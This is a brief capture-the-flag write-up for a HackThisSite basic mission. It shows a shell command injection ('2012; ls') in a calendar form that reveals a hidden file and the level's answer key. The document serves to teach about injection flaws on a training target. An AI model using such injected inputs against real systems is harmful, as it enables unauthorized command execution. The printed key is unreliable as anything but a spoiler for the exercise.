# Basic 7


https://www.hackthissite.org/missions/basic/6/


First we read the man page for `cal`.

Saw nothing interesting. We decided to just mess around with the input box and proceeded to enter nothing and also a few years to see the results. We got back calendars.

We realized this was simply executing our parameters, so we escaped the command and executed our own by passing

`2012; ls`

This returned the following after the calendar

```
.
..
cal.pl
index.php
k1kh31b1n55h.php
level7.php
```

Where `k1kh31b1n55h.php` is important, we visited the URL

https://www.hackthissite.org/missions/basic/6/k1kh31b1n55h.php

and got the key = `899643ac`
